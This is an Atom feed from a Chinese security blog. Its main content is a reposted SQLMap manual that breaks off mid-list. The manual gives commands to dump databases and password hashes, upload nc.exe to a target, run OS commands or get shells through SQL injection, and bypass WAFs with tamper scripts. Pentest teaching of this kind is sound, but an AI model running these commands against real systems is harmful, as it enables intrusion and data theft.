<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XYTK&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xytk0x0.github.io/"/>
  <updated>2020-01-27T14:17:42.838Z</updated>
  <id>https://xytk0x0.github.io/</id>
  
  <author>
    <name>XYTK</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>科比</title>
    <link href="https://xytk0x0.github.io/2020/01/27/%E7%A7%91%E6%AF%94/"/>
    <id>https://xytk0x0.github.io/2020/01/27/科比/</id>
    <published>2020-01-27T10:52:57.000Z</published>
    <updated>2020-01-27T14:17:42.838Z</updated>
    
    <content type="html"><![CDATA[<img src="/2020/01/27/科比/0.jpg" title="XYTK"><h1 id="终于到我们这一代人来感受越来越多的离别和苦难了"><a href="#终于到我们这一代人来感受越来越多的离别和苦难了" class="headerlink" title="终于到我们这一代人来感受越来越多的离别和苦难了"></a>终于到我们这一代人来感受越来越多的离别和苦难了</h1><h1 id="珍惜眼前人"><a href="#珍惜眼前人" class="headerlink" title="珍惜眼前人"></a>珍惜眼前人</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2020/01/27/科比/0.jpg&quot; title=&quot;XYTK&quot;&gt;

&lt;h1 id=&quot;终于到我们这一代人来感受越来越多的离别和苦难了&quot;&gt;&lt;a href=&quot;#终于到我们这一代人来感受越来越多的离别和苦难了&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>hacker101 ctf(2)</title>
    <link href="https://xytk0x0.github.io/2019/12/30/hacker101-ctf-2/"/>
    <id>https://xytk0x0.github.io/2019/12/30/hacker101-ctf-2/</id>
    <published>2019-12-30T01:22:38.000Z</published>
    <updated>2020-01-18T15:19:38.738Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7e551e36ef0676f96693dced5560f8f77262fc84ce4068e0287d278876dd74c9">ea22885867da60db8a88b86d450ff8353306c784eccb7905c997ebe6fe143c88577f54380f5220d9ba5e32c46f2745fa709ad782222cfd33c199051156f6b018c83773d234042e57d95fc055e4e6e186ce16b460ff68fc683a5e9f6c73b357ac258a3e8838a306a3043ebd12555a783282168b3db943e0854b81fd2b9b297ce9cbd43707c24c815ea0879524727e7be5846b9aff4d76ed79f86cae82005a151a72ff5a39250bf7a1833a1c73e8cdb4a3fb7b6ca87482ca7615203a952335ead5f0a1a0d646464bf360759a932de515b35a51bf04db228c98f0e071bff808cfdf8c4dc784d0266fc5fb0c19ad7bfad6b5761a4a7a251cf6a51bc2aecb29d1477c713821a8dc81d36a3187bc534e60fbbf7e2515cd9f61a378c2b60cbde473e4cf73549de34b41179c811528470b994c0cd2069fda4eda89e1b021c14f96757f3a2f29b5e4a80ad3b029fe3a8bd3e10c3db75f6dfafcb630b214e4eda28ed6ad72f3c417620d0e3fbac85a31b884545946779bcd2463f00a7bdca295aec669b1694e29e8fc4d33feaf23a8d9d75c0b29358dfe387f01fc9be30c0bb3c16faf277749a363ae62790a67c15bc1bb4180b188b532d671223936269a23a61b0eba55a59647cf958e5bc0484d6081f84932492db45b4c5ad9ec14054398b0a212f19f30adcfc6ce835cc504ec9ef908dca1fec42e524a58a5748ab82dc4c8e3d1b9d60e3be38bd2d6a112442fe578be9938240adf73488f053b5803e631b663d3168606820553966fc84fb6263017ef24a84921495a3dc7ab8a70cd5d4c5733646aa3e024b1fb45457e23b221da4febb395fa82532cf5c04d458872440a077e7aee6c75729111b33d850fa507b278b818930c15fd9a79cd9fb4a6c76fab7755e7512e162771e85274529d976325dcf11d3330ff9b9332cc9690f430662da2470e73faedd6ecfd1d2a12c32d9afffb539f43ca484a6f50a8bd864b250c8915872bd907605367c056841480bd9d6d004eb265402ae582adb038c0bf9bfb888c2c834989e7d3fb63b594df95c7d0fb87acad8caf13be59417b508f67a4930fc10118bacefe4040ffeaf18769bea44fdb116b18f5334126f62eceee5ef1b4103a3bc68c499505957606eb12a1d7017ed08f7a4b4a0b899cdb7fff863878008103a0b865b5d4abaa01ad04b587166c12ec21d566c665f5590717fe62e7e225fe0ce0e3b76e89d05f37bee96203396c146041b30036491773d7bf2b85e4ab36409c755495da0fc76c0fcb8674ad09044618e509cdbe28e3944bfb573e52b7872d547f2af295492bbfd05b6fbe699931671586d049460c4001f7d75b63158008f0b6e6acbc8d420af290f9ec8254b14fbe63dd0c4285f921535d3534eff046729a4888a16447ea93e64d51058acfb98a1c9fde945e93e928df8839a333f2fb51e68ebc2496d2e1525bf663a8ff0f8a69199789a3fee188b91e74bc8f62c9a341f28f5ede668e511a341dda44efb54a79e0e5a5864a2872169f7c1fc95cca7f79867c0ba945b975136b5cc047ba060b1463bfa77593e22455d9457b6f87ab8affc2cc82e7ec4d97dbfbb04b88f4ee4fb6d976d0e1fc63ea1cbfa2257f7bc79ddee9e4f808b8951127995e601ab8b4580eb893bacf0f56af14a6de9e95b2e198f94c6df9a9fd65bef4e328479d7d1121cc3e7da0412e67293e1c31a7f2986b1350cc257c70200ece233aeb7c2e978cff11821d5f601fe17b16638193136623cd6f06a36c040600b697282efcf2e8e4fe9a4c7f9a64bb61fb1b2143351f2cfce469e791a47dfcad0c82f338bbafdb110e2b126df1b7349c9f90f38bf491cb7aab61f6c64bffbeadf27b55f82478838ad0d286b6f77cf7cf6877dbf97a5874ffe7a8dc82e6b90e3be01427fdded2e3df840d5e449013cf45345bb7163dbd7b075bc2ce00d29b0eb47e2c40173c61dc09fbcd972916a2dfa47ff1e73c4643e0ca429b10faa2e512da1f5e4d4c53088c022f1f55f94bae205fc4f12e52fc718dd16389efe46b182dc82b3c62f5d03e6706088495a8828493dfb370bf22d00dc86c4dde7ca241f199d0e6b2c64fb7b1e739c92e20686663ac652b74a97384b75d655d459a11a16e5743ac09ab51998ab1d3e711553679558e2c28a9044eb685c2ea3db5343fe8751e7ac200a0907a1ad11bab0193f15a0b6ec8ecd3fa944d83da64eec6b5488c91995d7f86bdc26ed7f4771ca7f7752ca25dd0d63514e1a23cff42c58a85e03606110a7f6f1f51956689d803f75e89631d0dce2d878a374e547605af09d3be6058d43d8fb7b48d095f033483d5354802f47c87b1c9be772d73a95a46552da5a450be4732a7886067e06d1dfc87753c3ad877bb620ffdc3560aaade5a3a3f9e1bd610d204fc911edc48bb38dbde58dc84468ad239830511604a5778bc61bfd384a2b1af10cf92fe00f9c196df05b4098f9fc7f0d1e435439852c9fe4c445f08b4b89a5a47322747ce25f2545b2bf89ffe654064fb84864359e169c07871b0038d32a5d847a6e01090b9af1cb87899ede2a511230f2e286de56d757a75fd0655dfff6447186275205b6466c7a5dac6cd7cf64c6c5964cc9cc3d47b23f96c9a77658bce72ea1184c799439702081cb731b081dc844dbe0d34322170cfb416128ef2f98be0d366aca6de38ae20b88763783bbffd4f75879b8b6fefb99f8741d6316233119436730ff8f40dbbe3a7a6e88cfe2a51f7a8559d715d44a27d5612c51cc0a796d3f7e62bc5b9d9b88f224b3197511e7086d28fe376c3842e75f1f6c92619385d18a4cc708c220af12a3f870e209767fcc530cb05b1f406e997f3f5b8cf06a0a787e37ac9abbefff5b033b8ec60c8b880f46b148889f994c658520e678348e09e7d04377c4e6c318f26326b652b779d153996aeadece6009d503605346da52ac3bb506d5369ecb01e78df7380743ca4cb7327bf17f31f8e59254e6196964551205821</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="wp" scheme="https://xytk0x0.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>【转载】超详细SQLMap使用攻略及技巧分享</title>
    <link href="https://xytk0x0.github.io/2019/12/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E8%B6%85%E8%AF%A6%E7%BB%86SQLMap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB/"/>
    <id>https://xytk0x0.github.io/2019/12/27/【转载】超详细SQLMap使用攻略及技巧分享/</id>
    <published>2019-12-27T03:52:54.000Z</published>
    <updated>2019-12-27T05:45:43.949Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>原文地址：<a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164608.html</a></p><h1 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h1><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p><p>sqlmap支持五种不同的注入模式：</p><blockquote><p>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；<br>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；<br>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；<br>联合查询注入，可以使用union的情况下的注入；<br>堆查询注入，可以同时执行多条语句的执行时的注入。</p></blockquote><h1 id="SQL使用参数详解"><a href="#SQL使用参数详解" class="headerlink" title="SQL使用参数详解"></a>SQL使用参数详解</h1><p>本文以SQLmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><p>-h,–help  显示基本帮助信息并退出</p><p>-hh  显示高级帮助信息并退出</p><p>–version  显示程序版本信息并退出</p><p>-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>在这些选项中必须提供至少有一个确定目标</p><p> -d DIRECT    直接连接数据库的连接字符串</p><p>-u URL, –url=URL   目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1&quot;)，使用-u或者–url" target="_blank" rel="noopener">http://www.site.com/vuln.php?id=1&quot;)，使用-u或者–url</a></p><p>-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标</p><p>-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标</p><p>-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。</p><p>-r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</p><p>-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p><p>-c CONFIGFILE       从配置ini文件中加载选项</p><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><p>这些选项可以用来指定如何连接到目标URL</p><p>–method=METHOD  强制使用给定的HTTP方法（例如put）</p><pre><code>--data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data=&quot;id=1&quot; -f --banner --dbs --users</code></pre><p>   –param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p><p>   –cookie=COOKIE     HTTP Cookieheader 值</p><p>   –cookie-del=COO..  用来分隔cookie的字符串值</p><p>   –load-cookies=L..  Filecontaining cookies in Netscape/wget format</p><p>   –drop-set-cookie   IgnoreSet-Cookie header from response</p><p>   –user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入" target="_blank" rel="noopener">http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</a></p><p>   –random-agent     使用random-agent作为HTTP User-Agent头值</p><p>   –host=HOST         HTTP Hostheader value</p><p>   –referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p><p>   -H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1″)</p><p>   –headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123″)</p><p>   –auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</p><p>   –auth-cred=AUTH..  HTTP 认证凭证(name:password)</p><p>   –auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p><p>   –ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</p><p>   –ignore-proxy      忽略系统的默认代理设置</p><p>   –ignore-redirects忽略重定向的尝试</p><p>   –ignore-timeouts   忽略连接超时</p><p>   –proxy=PROXY       使用代理服务器连接到目标URL</p><p>   –proxy-cred=PRO..  代理认证凭证(name:password)</p><p>   –proxy-file=PRO..  从文件加载代理列表</p><p>   –tor               使用Tor匿名网络</p><p>   –tor-port=TORPORT  设置Tor代理端口</p><p>   –tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</p><p>   –check-tor       检查Tor的是否正确使用</p><p>   –delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><p>   –timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</p><p>   –retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p><p>   –randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p><p>   –safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下</p><p>   –safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</p><p>   –safe-req=SAFER..  从文件中加载安全HTTP请求</p><p>   –safe-freq=SAFE..  测试一个给定安全网址的两个访问请求</p><p>   –skip-urlencode    跳过URL的有效载荷数据编码</p><p>   –csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</p><p>   –csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌</p><p>   –force-ssl         强制使用SSL/HTTPS</p><p>   –hpp               使用HTTP参数污染的方法</p><p>   –eval=EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</p><p> sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import</a> hashlib;hash=hashlib.md5(id).hexdigest()”</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>这些选项可用于优化sqlmap性能</p><p>-o               打开所有的优化开关</p><p>–predict-output    预测普通查询输出</p><p>–keep-alive        使用持久HTTP（S）连接</p><p>–null-connection   获取页面长度</p><p>–threads=THREADS   当前http(s)最大请求数 (默认 1)</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p><p>   -p TESTPARAMETER    可测试的参数</p><p>   –skip=SKIP         跳过对给定参数的测试</p><p>   –skip-static       跳过测试不显示为动态的参数</p><p>   –param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）</p><p>   –dbms=DBMS         强制后端的DBMS为此值</p><p>   –dbms-cred=DBMS..  DBMS认证凭证(user:password)</p><p>   –os=OS            强制后端的DBMS操作系统为这个值</p><p>   –invalid-bignum    使用大数字使值无效</p><p>   –invalid-logical   使用逻辑操作使值无效</p><p>   –invalid-string    使用随机字符串使值无效</p><p>   –no-cast          关闭有效载荷铸造机制</p><p>   –no-escape         关闭字符串逃逸机制</p><p>   –prefix=PREFIX     注入payload字符串前缀</p><p>   –suffix=SUFFIX     注入payload字符串后缀</p><p>   –tamper=TAMPER   使用给定的脚本篡改注入数据</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p><p>   –level=LEVEL     执行测试的等级（1-5，默认为1）</p><p>   –risk=RISK       执行测试的风险（0-3，默认为1）</p><p>   –string=STRING    查询时有效时在页面匹配字符串</p><p>   –not-string=NOT..  当查询求值为无效时匹配的字符串</p><p>   –regexp=REGEXP     查询时有效时在页面匹配正则表达式</p><p>   –code=CODE       当查询求值为True时匹配的HTTP代码</p><p>   –text-only        仅基于在文本内容比较网页</p><p>   –titles           仅根据他们的标题进行比较</p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p> 这些选项可用于调整具体的SQL注入测试</p><p>   –technique=TECH    SQL注入技术测试（默认BEUST）</p><p>   –time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）</p><p>   –union-cols=UCOLS  定列范围用于测试UNION查询注入</p><p>   –union-char=UCHAR  暴力猜测列的字符数</p><p>   –union-from=UFROM  SQL注入UNION查询使用的格式</p><p>   –dns-domain=DNS..  DNS泄露攻击使用的域名</p><p>   –second-order=S..  URL搜索产生的结果页面</p><h2 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h2><p>-f, –fingerprint   执行广泛的DBMS版本指纹检查</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</p><p>   -a, –all           获取所有信息</p><p>   -b, –banner        获取数据库管理系统的标识</p><p>   –current-user      获取数据库管理系统当前用户</p><p>   –current-db        获取数据库管理系统当前数据库</p><p>–hostname         获取数据库服务器的主机名称</p><p>   –is-dba            检测DBMS当前用户是否DBA</p><p>   –users             枚举数据库管理系统用户</p><p>   –passwords         枚举数据库管理系统用户密码哈希</p><p>   –privileges        枚举数据库管理系统用户的权限</p><p>   –roles            枚举数据库管理系统用户的角色</p><p>   –dbs             枚举数据库管理系统数据库</p><p>   –tables            枚举的DBMS数据库中的表</p><p>   –columns          枚举DBMS数据库表列</p><p>   –schema            枚举数据库架构</p><p>   –count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb</p><p>   –dump            转储数据库表项</p><p>–dump-all          转储数据库所有表项</p><p>   –search           搜索列（S），表（S）和/或数据库名称（S）</p><p>   –comments          获取DBMS注释</p><p>   -D DB               要进行枚举的指定数据库名</p><p>   -T TBL              DBMS数据库表枚举</p><p>   -C COL             DBMS数据库表列枚举</p><p>   -X EXCLUDECOL     DBMS数据库表不进行枚举</p><p>   -U USER           用来进行枚举的数据库用户</p><p>   –exclude-sysdbs    枚举表时排除系统数据库</p><p>   –pivot-column=P..  Pivot columnname</p><p>   –where=DUMPWHERE   Use WHEREcondition while table dumping</p><p>   –start=LIMITSTART  获取第一个查询输出数据位置</p><p>   –stop=LIMITSTOP   获取最后查询的输出数据</p><p>   –first=FIRSTCHAR   第一个查询输出字的字符获取</p><p>   –last=LASTCHAR    最后查询的输出字字符获取</p><p>   –sql-query=QUERY   要执行的SQL语句</p><p>   –sql-shell         提示交互式SQL的shell</p><p>   –sql-file=SQLFILE  要执行的SQL文件</p><h2 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h2><p>这些选项可以被用来运行暴力检查</p><p>   –common-tables     检查存在共同表</p><p>   –common-columns    检查存在共同列</p><h2 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h2><p>这些选项可以用来创建用户自定义函数</p><p>   –udf-inject    注入用户自定义函数</p><p>   –shared-lib=SHLIB  共享库的本地路径</p><h2 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h2><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统</p><p>   –file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:</p><p>sqlmap.py -u”<a href="http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read" target="_blank" rel="noopener">http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read</a> “C:/example.exe” -v 1</p><p>   –file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件</p><p>   –file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径</p><p>在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：</p><p>python sqlmap.py -u”<a href="http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1”" target="_blank" rel="noopener">http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1”</a> –file-write”/software/nc.exe” –file-dest “C:/WINDOWS/Temp/nc.exe” -v1</p><h2 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h2><p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p><p>   –os-cmd=OSCMD   执行操作系统命令（OSCMD）</p><p>   –os-shell          交互式的操作系统的shell</p><p>   –os-pwn          获取一个OOB shell，meterpreter或VNC</p><p>   –os-smbrelay       一键获取一个OOBshell，meterpreter或VNC</p><p>   –os-bof           存储过程缓冲区溢出利用</p><p>   –priv-esc          数据库进程用户权限提升</p><p>   –msf-path=MSFPATH  MetasploitFramework本地的安装路径</p><p>   –tmp-path=TMPPATH  远程临时文件目录的绝对路径</p><p>linux查看当前用户命令：</p><p>sqlmap.py -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”</a> –os-cmd id -v1</p><h2 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h2><p>这些选项可以被用来访问后端数据库管理系统Windows注册表</p><p>   –reg-read          读一个Windows注册表项值</p><p>   –reg-add           写一个Windows注册表项值数据</p><p>   –reg-del           删除Windows注册表键值</p><p>   –reg-key=REGKEY    Windows注册表键</p><p>   –reg-value=REGVAL  Windows注册表项值</p><p>   –reg-data=REGDATA  Windows注册表键值数据</p><p>   –reg-type=REGTYPE  Windows注册表项值类型</p><h2 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h2><p>这些选项可以用来设置一些一般的工作参数</p><p>   -s SESSIONFILE     保存和恢复检索会话文件的所有数据</p><p>   -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中</p><p>   –batch            从不询问用户输入，使用所有默认配置。</p><p>   –binary-fields=..  结果字段具有二进制值(e.g.”digest”)</p><p>   –charset=CHARSET   强制字符编码</p><p>   –crawl=CRAWLDEPTH  从目标URL爬行网站</p><p>   –crawl-exclude=..  正则表达式从爬行页中排除</p><p>   –csv-del=CSVDEL    限定使用CSV输出 (default”,”)</p><p>   –dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)</p><p>   –eta              显示每个输出的预计到达时间</p><p>   –flush-session     刷新当前目标的会话文件</p><p>   –forms           解析和测试目标URL表单</p><p>–fresh-queries     忽略在会话文件中存储的查询结果</p><p>   –hex             使用DBMS Hex函数数据检索</p><p>   –output-dir=OUT..  自定义输出目录路径</p><p>   –parse-errors      解析和显示响应数据库错误信息</p><p>   –save=SAVECONFIG   保存选项到INI配置文件</p><p>   –scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标</p><p>   –test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)</p><p>   –test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)</p><p>   –update            更新sqlmap</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>   -z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</p><p>   –alert=ALERT       发现SQL注入时，运行主机操作系统命令</p><p>   –answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”" target="_blank" rel="noopener">http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”</a> –batch</p><p>   –beep    发现sql注入时，发出蜂鸣声。</p><p>   –cleanup     清除sqlmap注入时在DBMS中产生的udf与表。</p><p>   –dependencies      Check formissing (non-core) sqlmap dependencies</p><p>   –disable-coloring  默认彩色输出，禁掉彩色输出。</p><p>   –gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</p><p>   –identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</p><p>   –mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p><p>   –offline           Work inoffline mode (only use session data)</p><p>   –purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p><p>   –skip-waf           跳过WAF／IPS / IDS启发式检测保护</p><p>   –smart            进行积极的启发式测试，快速判断为注入的报错点进行注入</p><p>   –sqlmap-shell      互动提示一个sqlmapshell</p><p>   –tmp-dir=TMPDIR    用于存储临时文件的本地目录</p><p>   –web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)</p><p>   –wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</p><h1 id="SQLMAP实用技巧"><a href="#SQLMAP实用技巧" class="headerlink" title="SQLMAP实用技巧"></a>SQLMAP实用技巧</h1><h2 id="mysql的注释方法进行绕过WAF进行SQL注入"><a href="#mysql的注释方法进行绕过WAF进行SQL注入" class="headerlink" title="mysql的注释方法进行绕过WAF进行SQL注入"></a>mysql的注释方法进行绕过WAF进行SQL注入</h2><p>（1）修改C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py</p><p>return match.group().replace(word,”/*!0%s” % word) 为：</p><p>return match.group().replace(word,”/<em>!50000%s</em>/” % word)</p><p>（2）修改C:\Python27\sqlmap\xml\queries.xml</p><p>&lt;cast query=”CAST(%s ASCHAR)”/&gt;为：</p><p>&lt;castquery=”convert(%s,CHAR)”/&gt;</p><p>（3）使用sqlmap进行注入测试</p><p>sqlmap.py -u”http://**.com/detail.php? id=16″ –tamper “halfversionedmorekeywords.py”</p><p>其它绕过waf脚本方法：</p><p>sqlmap.py-u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1”</a> –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</p><p>（4）tamper目录下文件具体含义：</p><p>space2comment.py用/**/代替空格</p><p>apostrophemask.py用utf8代替引号</p><p>equaltolike.pylike代替等号</p><p>space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</p><p>greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。</p><p>space2hash.py空格替换为#号,随机字符串以及换行符</p><p>apostrophenullencode.py绕过过滤双引号，替换字符和双引号。</p><p>halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p><p>space2morehash.py空格替换为 #号 以及更多随机字符串 换行符</p><p>appendnullbyte.py在有效负荷结束位置加载零字节字符编码</p><p>ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</p><p>space2mssqlblank.py(mssql)空格替换为其它空符号</p><p>base64encode.py　用base64编码替换</p><p>space2mssqlhash.py　替换空格</p><p>modsecurityversioned.py过滤空格，包含完整的查询版本注释</p><p>space2mysqlblank.py　